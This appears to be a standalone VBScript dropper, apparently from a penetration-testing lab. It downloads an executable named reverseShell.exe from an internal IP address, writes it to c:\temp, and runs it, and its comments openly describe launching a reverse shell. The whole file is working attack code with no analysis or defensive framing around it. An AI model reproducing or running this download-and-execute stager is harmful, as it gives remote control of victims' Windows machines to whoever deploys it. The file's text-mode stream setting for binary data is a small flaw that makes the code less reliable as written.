'Define object
Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1") 

'Call Download link with a file
URL = "http://192.168.218.131/reverseShell.exe"
objWinHttp.open "GET", URL, False
objWinHttp.send "" 

'Save binary data to disk 
SaveBinaryData "c:\temp\reverseShell.exe", objWinHttp.responseBody

'Execute reverse shell
set WshShell = WScript.CreateObject("WScript.Shell")
Dim exeName 
Dim statusCode

exeName = "c:\temp\reverseShell.exe"
statusCode = WshShell.Run(exeName, 1, true)

Function SaveBinaryData(FileName, Data)
	Const adTypeText = 1
	Const adSaveCreateOverWrite = 2
	
	'Create Stream object
	Dim BinaryStream 
	Set BinaryStream = CreateObject("ADODB.Stream")
	
	'Specify stream type - we wamt To save Data/String data. 
	BinaryStream.Type = adTypeText 
	
	'Open the stream and write binary data to the object
	BinaryStream.Open 
	BinaryStream.Write Data
	
	'Save binary data to disk
	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
End Function
